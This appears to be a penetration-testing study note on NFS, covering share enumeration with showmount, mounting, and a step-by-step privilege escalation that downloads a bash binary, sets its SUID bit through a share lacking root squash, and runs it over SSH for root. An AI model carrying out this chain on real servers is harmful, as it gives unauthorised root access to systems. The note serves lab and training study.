It is important to have this package installed on any machine that uses NFS, either as client or server. It includes programs such as: **lockd**, **statd**, **showmount**, **nfsstat,** **gssd**, **idmapd** and **mount.nfs**. Primarily, we are concerned with "showmount" and "mount.nfs" as these are going to be most useful to us when it comes to extracting information from the NFS share.
# Useful Commands:

To display information about mounted file systems exported by Server for NFS on a specified computer - NFS enumeration - :

```bash
showmount <Target ip address> -e
or
/usr/sbin/showmount <Target ip address> -e
```

Then, we can use the "mount" command to connect the NFS share to the mount point on our machine like so:

```bash
sudo mount -t nfs IP:share /tmp/mount/ -nolock
``` 

|**Tag**|**Function**|
|:-------:|:------:|
|sudo|Run as root| 
|mount|Execute the mount command|
|-t nfs|Type of device to mount, then specifying that it's NFS|
|IP:share|The IP Address of the NFS server, and the share you want to mount|
|-nolock|Specifies not to use NLM locking|

**Note**: First we must make a tmp directory that will be removed on restart using ```mkdir /tmp/mount``` then we use the "mount" command we just explained to mount the share on our local device.
# NFS Exploiting:

First we use nmap [[Nmap NSE & Commands]] to enumerate and check for open ports and running services on the remote machine.

Next, we use the the following command to display information about mounted file systems exported by Server for NFS on a specified computer - NFS enumeration - :

```bash
showmount <Target ip address> -e
or 
/usr/sbin/showmount <Target ip address> -e
```

Then, we make a tmp folder to mount the share to it using `mkdir /tmp/mount`, and we use the "mount" command to connect the NFS share to the mount point on our machine like so:

```bash
sudo mount -t nfs IP:share /tmp/mount/ -nolock
``` 

After that, we use the following command to download an executable bash:

```bash
sudo wget https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash
```

**Note:** we use must sudo to get the permissions of root and to download it as root owner, then we set the SUID and executable bits using the following commands:

```bash
sudo chmod +s <file>
sudo chmod +x <file>
```

Finally, we connect to the server using ssh `_ssh -i <key-file> <username>@<ip>` then we copy the file to the share and execute it from the remote user account and execute the bash we downloaded with SUID flag set using this command:

**Note:** don't forget to change the id_rsa file (ssh private key) permissions to 600.

```bash
./bash -p
```

**Note:** The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.
## Pathway Summary:

    NFS Access ->

        Gain Low Privilege Shell ->

            Upload Bash Executable to the NFS share ->

                Set SUID Permissions Through NFS Due To Misconfigured Root Squash ->

                    Login through SSH ->

                        Execute SUID Bit Bash Executable ->

                            ROOT ACCESS
# Extra:

## What is root_squash?

By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume. Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want. However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.


